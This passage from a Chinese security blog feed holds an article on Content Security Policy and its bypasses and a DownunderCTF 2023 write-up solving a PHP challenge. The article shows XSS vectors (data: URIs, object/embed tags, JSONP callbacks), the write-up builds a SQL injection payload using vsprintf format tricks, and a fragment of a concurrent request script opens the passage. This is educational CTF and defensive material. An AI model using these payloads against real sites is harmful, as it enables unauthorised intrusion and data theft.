创建一个aiohttp的ClientSession实例</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">    	tasks = []</span><br><span class="line">    	<span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        		tasks.append(fetch_url(session,url))</span><br><span class="line">    	<span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行主要的协程</span></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>xss之CSP的原理和绕过</title>
    <url>//posts/xss%E4%B9%8BCSP%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="CSP的原理和绕过"><a href="#CSP的原理和绕过" class="headerlink" title="CSP的原理和绕过"></a>CSP的原理和绕过</h1><p>xss的编码那么复杂，一不小心就会过滤失败，同时不同的触发点还要逐个修复、即使可以统前端过滤，仍存在漏掉的风险。那么有没有一种办法可以禁止用户插入的js代码执行呢？是有的，这就是CSP！</p>
<p>CSP的实现和执行全部由浏览器完成，浏览器来根据你的规则，禁止引入外部的那些链接和插入的js代码的执行，那怎么告诉浏览器我要开启CSP策略呢？</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>1、<strong>通过 HTTP 头信息的Content-Security-Policy</strong></p>
<figure class="highlight csp"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">script-src</span> <span class="string">&#x27;self&#x27;</span>; <span class="keyword">object-src</span> <span class="string">&#x27;none&#x27;</span>; </span><br><span class="line"><span class="keyword">style-src</span> cdn.example.org third-party.org; <span class="keyword">child-src</span> https:</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>2、<strong>通过网页的meta标签。</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="CSP策略字段"><a href="#CSP策略字段" class="headerlink" title="CSP策略字段"></a>CSP策略字段</h2><p>我们在网站的响应头重可以看到一般CSP的HTTP Header长这样：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: </span><br><span class="line">base-uri &#x27;self&#x27;;</span><br><span class="line">object-src &#x27;self&#x27;;</span><br><span class="line">script-src &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27; &#x27;report-sample&#x27; *.xxx.com; </span><br><span class="line">frame-src &#x27;self&#x27; *.xxx.com;</span><br><span class="line">report-uri https://xxx.log.xxx.com</span><br></pre></td></tr></table></figure>

<p>常用的CSP字段表：</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>default-src</strong></td>
<td align="left">针对 <code>xxx-src</code> 指令的默认行为</td>
</tr>
<tr>
<td align="left"><strong>script-src</strong></td>
<td align="left">限制脚本加载白名单</td>
</tr>
<tr>
<td align="left"><strong>base-uri</strong></td>
<td align="left">指定 <code>&lt;base&gt;</code> 标签的 url 的值</td>
</tr>
<tr>
<td align="left"><strong>child-src</strong></td>
<td align="left">限制内嵌框架，比如 frame， iframe 的域名白名单</td>
</tr>
<tr>
<td align="left"><strong>connect-src</strong></td>
<td align="left">限定对外请求域名的白名单 (通过 XHR、WebSockets、EventSource等)</td>
</tr>
<tr>
<td align="left"><strong>font-src</strong></td>
<td align="left">限定字体文件的请求域名白名单</td>
</tr>
<tr>
<td align="left"><strong>form-action</strong></td>
<td align="left">限定 <code>&lt;form&gt;</code> 标签表单提交的白名单，就是 action 的域名白名单</td>
</tr>
<tr>
<td align="left"><strong>frame-ancestors</strong></td>
<td align="left">指定可以嵌入当前页面的外部资源。 该指令适用于 <code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;embed&gt;</code> 和 <code>&lt;applet&gt;</code> 标记。 该指令不能在 <code>&lt;meta&gt;</code> 标记中使用，并且仅适用于非 HTML 资源。</td>
</tr>
<tr>
<td align="left"><strong>frame-src</strong></td>
<td align="left">等同于 child-src，在第二版废弃过，第三版又恢复</td>
</tr>
<tr>
<td align="left"><strong>img-src</strong></td>
<td align="left">限定图片加载域名白名单</td>
</tr>
<tr>
<td align="left"><strong>media-src</strong></td>
<td align="left">限定视频和音频的加载域名白名单</td>
</tr>
<tr>
<td align="left"><strong>object-src</strong></td>
<td align="left">插件加载白名单，比如 flash</td>
</tr>
<tr>
<td align="left"><strong>plugin-types</strong></td>
<td align="left">限制可以使用的插件格式</td>
</tr>
<tr>
<td align="left"><strong>report-uri</strong></td>
<td align="left">指定当违反内容安全策略时浏览器将发送报告的 URL。 此指令不能在 标记中使用。 下面有 demo 演示</td>
</tr>
<tr>
<td align="left"><strong>style-src</strong></td>
<td align="left">样式表加载白名单</td>
</tr>
<tr>
<td align="left"><strong>upgrade-insecure-requests</strong></td>
<td align="left">自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</td>
</tr>
<tr>
<td align="left"><strong>worker-src</strong></td>
<td align="left">限制 worker 加载白名单(包含 shared worker，service worker)， 第三版才有， 支持有限</td>
</tr>
</tbody></table>
<p>对于不同的src分别设置有时候是繁杂的。可以通过default-src统一设置默认。当default-src设置时，任何xxx-src如果没有设置，即为default-src的策略，如果设置则覆盖default-src的策略。</p>
<h3 id="CSP特殊设置字段"><a href="#CSP特殊设置字段" class="headerlink" title="CSP特殊设置字段"></a>CSP特殊设置字段</h3><h4 id="unsafe-inline-含义"><a href="#unsafe-inline-含义" class="headerlink" title="unsafe-inline 含义"></a>unsafe-inline 含义</h4><p>unsafe-inline允许内联的js和css的执行，比如on事件、javascript伪协议script标签内代码等。如果不声明此字段，很多网站的功能可能会异常。但是这并不是CSP的缺陷，而是开发编码的问题，如果可以做到统一不使用内联js，比如编排好使用的js文件，不使用内联函数，关闭unsafe-inline即可防止绝大多数的xss。</p>
<p>当然也有另一种方法可以在不实用unsafe-inline的情况下执行js代码，比如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Hello, world.&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这个代码的哈希值计算结果放在 CSP 里面：<br>Content-Security-Policy: script-src ‘sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng&#x3D;’</p>
<p>但是即使禁用了unsafe-inline script-src还有另一个攻击面： data：src</p>
<p>当date可用时也会造成xss的攻击</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:text/javascript,evil()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="unsafe-eval含义"><a href="#unsafe-eval含义" class="headerlink" title="unsafe-eval含义"></a>unsafe-eval含义</h4><p>unsafe-eval允许将字符串重新转为可执行代码，比较高风险，如无必要，也是禁止开放。</p>
<h4 id="object-src"><a href="#object-src" class="headerlink" title="object-src"></a>object-src</h4><p>如果没有default-src设置的话，object-src必须设置，因为Flash 里面可以执行外部脚本。会导致各种安全问题。</p>
<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>必须特别注意 JSONP 的回调函数。因为再多次测试中发现，jsonp的回调函数一般是可控的，这种同域名下的可控回调会导致CSP策略的失效。比如你限制了必需是网站子域名，正好子域名中有一个jsonp回调函数可控，那么就有了加载任意js的资源点。</p>
<p>一旦myCallback参数可控且在返回中，那么返回的js代码就可控了。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;! DOCTYPE html &gt;</span><br><span class="line">&lt; html lang=&quot;en&quot; &gt;</span><br><span class="line">&lt; head &gt;</span><br><span class="line">    &lt; meta charset=&quot;UTF-8&quot; &gt;</span><br><span class="line">    &lt; title &gt; jsonp下XSS注入 &lt; /title&gt;</span><br><span class="line">&lt; /head&gt;</span><br><span class="line">&lt; body &gt;</span><br><span class="line">&lt; script &gt;</span><br><span class="line">    function myCallback(jsonObject) &#123;</span><br><span class="line">        //函数内容</span><br><span class="line">    &#125;</span><br><span class="line">&lt; script src=&quot;https://xxx.com?callback=myCallback&quot; &gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt; /body&gt;</span><br><span class="line">&lt; /html&gt;</span><br></pre></td></tr></table></figure>





<h2 id="CSP的错误配置和绕过"><a href="#CSP的错误配置和绕过" class="headerlink" title="CSP的错误配置和绕过"></a>CSP的错误配置和绕过</h2><p>推荐一个分析CSP策略缺陷的在线工具：<a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a></p>
<h3 id="为了正常功能使用unsafe-inline"><a href="#为了正常功能使用unsafe-inline" class="headerlink" title="为了正常功能使用unsafe-inline"></a>为了正常功能使用unsafe-inline</h3><p>如下面的策略使用了unsafe-inline就可以争产的xss注入了</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>script-src https://sina.com https://baidu.com &#x27;unsafe-inline&#x27; child-src &#x27;none&#x27;; report-uri /Report-parsing-url;</span><br></pre></td></tr></table></figure>
<h3 id="忘记配置object-src"><a href="#忘记配置object-src" class="headerlink" title="忘记配置object-src"></a>忘记配置object-src</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>script-src https://sina.com https://baidu.com &#x27;unsafe-inline&#x27;; report-uri /Report-parsing-url;</span><br></pre></td></tr></table></figure>
<p>上面的代码没有配置object-src属性，可能会导致flash相关的安全问题,以下几种标签都可以加载flash。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;https://not-example.com/flash&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;https://not-example.com/plugin&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">applet</span> <span class="attr">archive</span>=<span class="string">&quot;https://not-example.com/java&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">applet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="jsonp绕过CSP"><a href="#jsonp绕过CSP" class="headerlink" title="jsonp绕过CSP"></a>jsonp绕过CSP</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy:script-src ‘self’ accounts.google.com/random/ website.with.redirect.com; object-src ‘none’; report-uri /Report-parsing-url;</span><br></pre></td></tr></table></figure>
<p>如果白名单内的域名存在jsonp回调函数可操纵的漏洞，就会造成CSP的绕过。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://web.dev/csp/#policy-applies-to-a-wide-variety-of-resources">https://web.dev/csp/#policy-applies-to-a-wide-variety-of-resources</a></li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2023DownunderCTF-writeup</title>
    <url>//posts/2023DownunderCTF-writeup/</url>
    <content><![CDATA[<h1 id="DownunderCTF-2023-writeup"><a href="#DownunderCTF-2023-writeup" class="headerlink" title="DownunderCTF 2023 writeup"></a>DownunderCTF 2023 writeup</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这比赛周末打的，web题目做出来一半(简单的那一半)，medium以上的一道题目没做出来，名次由于这次只有我一个人参加，而我只会做些web和misc以及一点点crypto，逆向和pwn完全不会，而且国外的套路和国内还是不一样啊。最终排名也是泯然众人，中间名次。看了看后来的wp，简单的写一些这次收获到内容的一些题目吧。</p>
<p>这个比赛很好的一点在于提供了所有的题目环境，下次再出题正好改改。😂</p>
<p>题目环境地址：<a href="https://github.com/DownUnderCTF/Challenges_2023_Public/">https://github.com/DownUnderCTF/Challenges_2023_Public/</a></p>
<span id="more"></span>

<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="smooth-jazz"><a href="#smooth-jazz" class="headerlink" title="smooth-jazz"></a>smooth-jazz</h4><p>题目代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysql_fquery</span>(<span class="params"><span class="variable">$mysqli</span>, <span class="variable">$query</span>, <span class="variable">$params</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>, <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$query</span>, <span class="variable">$params</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$mysqli</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;db&#x27;</span>, <span class="string">&#x27;challuser&#x27;</span>, <span class="string">&#x27;challpass&#x27;</span>, <span class="string">&#x27;challenge&#x27;</span>);</span><br><span class="line">  <span class="variable">$username</span> = <span class="title function_ invoke__">strtr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], [<span class="string">&#x27;&quot;&#x27;</span> =&gt; <span class="string">&#x27;\\&quot;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span> =&gt; <span class="string">&#x27;\\\\&#x27;</span>]);</span><br><span class="line">  <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;%s&quot;&#x27;</span>, [<span class="variable">$username</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Username not found.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&quot; AND password = &quot;%s&quot;&#x27;</span>, [<span class="variable">$password</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Invalid password.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$htmlsafe_username</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$username</span>, ENT_COMPAT | ENT_SUBSTITUTE);</span><br><span class="line">  <span class="variable">$greeting</span> = <span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> </span><br><span class="line">      ? <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s and the flag is %s&quot;</span></span><br><span class="line">      : <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$message</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$greeting</span>, [<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>), <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>)]);</span><br><span class="line">  </span><br><span class="line">  fail:</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;🎷 Smooth Jazz&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">      background-color: <span class="comment">#f8f8f8;</span></span><br><span class="line">      font-family: Arial, sans-serif;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .container &#123;</span><br><span class="line">      max-width: <span class="number">400</span>px;</span><br><span class="line">      margin: <span class="number">100</span>px auto;</span><br><span class="line">      padding: <span class="number">20</span>px;</span><br><span class="line">      background-color: <span class="comment">#fff;</span></span><br><span class="line">      border-radius: <span class="number">5</span>px;</span><br><span class="line">      box-shadow: <span class="number">0</span> <span class="number">2</span>px <span class="number">5</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">      text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h1 &#123;</span><br><span class="line">      color: <span class="comment">#333;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    form &#123;</span><br><span class="line">      margin-top: <span class="number">20</span>px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    label, input &#123;</span><br><span class="line">      display: block;</span><br><span class="line">      margin-bottom: <span class="number">10</span>px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    input[type=<span class="string">&quot;text&quot;</span>],</span><br><span class="line">    input[type=<span class="string">&quot;password&quot;</span>] &#123;</span><br><span class="line">      width: <span class="number">100</span>%;</span><br><span class="line">      padding: <span class="number">10</span>px;</span><br><span class="line">      border: <span class="number">1</span>px solid <span class="comment">#ccc;</span></span><br><span class="line">      border-radius: <span class="number">4</span>px;</span><br><span class="line">      box-sizing: border-box;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    input[type=<span class="string">&quot;submit&quot;</span>] &#123;</span><br><span class="line">      width: <span class="number">100</span>%;</span><br><span class="line">      padding: <span class="number">10</span>px;</span><br><span class="line">      background-color: <span class="comment">#4287f5;</span></span><br><span class="line">      color: white;</span><br><span class="line">      border: none;</span><br><span class="line">      border-radius: <span class="number">4</span>px;</span><br><span class="line">      cursor: pointer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .music-player &#123;</span><br><span class="line">      margin-top: <span class="number">20</span>px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h2 &#123;</span><br><span class="line">      color: <span class="comment">#333;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    audio &#123;</span><br><span class="line">      width: <span class="number">100</span>%;</span><br><span class="line">      margin-top: <span class="number">10</span>px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .message &#123;</span><br><span class="line">      margin-top: <span class="number">10</span>px;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h1</span>&gt;<span class="title">Smooth</span> <span class="title">Jazz</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">username</span>&quot;&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Enter</span> <span class="title">your</span> <span class="title">username</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">password</span>&quot;&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Enter</span> <span class="title">your</span> <span class="title">password</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Login</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">music</span>-<span class="title">player</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">audio</span> <span class="title">src</span>=&quot;/<span class="title">offering</span>-<span class="title">larry</span>-<span class="title">stephens</span>.<span class="title">mp3</span>&quot; <span class="title">id</span>=&quot;<span class="title">audio</span>&quot;&gt;&lt;/<span class="title">audio</span>&gt;</span></span><br><span class="line"><span class="class">      <span class="title">If</span> <span class="title">you</span> <span class="title">are</span> <span class="title">stuck</span>, <span class="title">you</span> <span class="title">can</span> &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">javascript</span>:<span class="title">document</span>.<span class="title">getElementById</span>(&#x27;<span class="title">audio</span>&#x27;).<span class="title">play</span>()&quot;&gt;<span class="title">listen</span> <span class="title">to</span> <span class="title">some</span> <span class="title">smooth</span> <span class="title">jazz</span>&lt;/<span class="title">a</span>&gt;.</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">message</span>&quot; <span class="title">class</span>=&quot;<span class="title">message</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">p</span>&gt;&lt;?= $<span class="title">message</span> ?? &#x27;&#x27; ?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>先说下整体逻辑，</p>
<p>1、先判断用户名是否存在</p>
<p>2、sql查询对应用户名、密码是否存在在数据库</p>
<p>3、最后$username还要强等于(&#x3D;&#x3D;&#x3D;)admin 才能拿到flag</p>
<p>其实一开始我以为是宽字节注入呢，因为我构造admin%df’进入发现可以绕过第一步，但是怎么都无法注入，后续查看数据库编码也没有gbk的编码形式。其实这里涉及的是另一个考点：</p>
<p><strong>UTF截断</strong>：UTF截断会截断无效内容，比如 admin和admin%ff 应该是一样的。</p>
<p>所以我这里可以通过这种方法绕过第一步，但这里不是宽字节注入。而且后续还要强等于admin，这个&#x3D;&#x3D;&#x3D;印象中在非特殊环境下是不可绕过的。而且根据代码来看，注入点应该在第二个查询语句中。</p>
<p>现在好像是无解的，但是代码最开头的地方有一个vsprintf，比赛中我也忽略了，我以为考点在下面，这里的vsprintf 根据格式字符串中的格式指示符，常见用法就是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># %[argnum$][flags][width][.precision]specifier.</span></span><br><span class="line"><span class="comment"># 必须参数就是%specifier 中间都是可选参数</span></span><br><span class="line"><span class="comment">#一些用法</span></span><br><span class="line"><span class="comment"># %表示要被格式的参数 后面跟类型 %s就是字符串</span></span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;Hello, %s! Today is %s.&#x27;</span>, [<span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;Monday&#x27;</span>]);</span><br><span class="line"><span class="comment"># %1$s 表示第一个字符要被格式成字符串，%2$d 表示第二个字符要被格式成数字。</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;Name: %1$s, Age: %2$d&#x27;</span>, [<span class="string">&#x27;John&#x27;</span>, <span class="number">25</span>]);</span><br><span class="line"><span class="comment"># %1$&#x27;a10 表示单引号后的第一个字符要填充 填充10次。然后拼接后面的3</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="string">&quot;Like %1\$&#x27;a10s&quot;</span>, [<span class="string">&quot;3&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当然还是建议去看下官方文档，详细了解所有用法：</p>
<p><a href="https://www.php.net/manual/zh/function.vsprintf.php">https://www.php.net/manual/zh/function.vsprintf.php</a></p>
<p>如果我们插入一个%1$c 然后把password 的 sha1 生成一个34开头的字符串(char类型只拿前面的一个char格式化字符串):</p>
<p>![image-20230906145114573](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230906145114573.png)</p>
<p>那么我们就格式化字符串的时候就拿到一个双引号，也就是我们可以闭合了。</p>
<p>那我们的注入payload就可以是</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">username=admin%ff%1$c||1#&amp;password=668</span><br></pre></td></tr></table></figure>

<p>\xff 是为了utf8截断从而绕过sql查询部分的admin的判断，截断后面的东西都不会被和admin比较了</p>
<p>![image-20230906151947718](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230906151947718.png)</p>
<p>但是还是有一个问题，怎么突破&#x3D;&#x3D;&#x3D;’admin’强等判断打印flag呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$htmlsafe_username</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$username</span>, ENT_COMPAT | ENT_SUBSTITUTE);</span><br><span class="line"><span class="variable">$greeting</span> = <span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> </span><br><span class="line">    ? <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s and the flag is %s&quot;</span></span><br><span class="line">    : <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$greeting</span>, [<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>), <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>)]);</span><br></pre></td></tr></table></figure>

<p>这里仍然利用vsprintf，我们既然绕不过&#x3D;&#x3D;&#x3D;”admin” 能不能在格式化字符串的时候再创建一个变量放置位把getenv(‘FLAG’) 打印出来？</p>
<p>如果我们直接插入%2$s 那么在sql注入格式化字符串的时候就会报错，因为那里的参数只有一个[password]，我们需要的是成功执行sql注入并在最后一个vsprintf中能拿到类似%2$s的字段来把flag格式化写进去，那么我们需要第二个变量位置它在拼接sql语句时不进行格式化，在最后一个vsprintf处把flag格式化进去：</p>
<p>这步的关键在于htmlspecialchars</p>
